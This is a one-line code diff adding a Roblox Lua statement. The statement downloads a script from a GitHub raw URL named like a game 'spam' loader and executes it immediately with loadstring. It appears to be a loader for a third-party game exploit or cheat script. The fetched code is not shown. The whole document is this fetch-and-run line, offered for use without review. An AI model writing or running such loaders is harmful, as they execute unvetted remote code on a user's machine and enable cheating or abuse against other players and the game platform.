@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/7-days-cat-sitting-spam6-jhngfik1kuy3tm.lua"))()
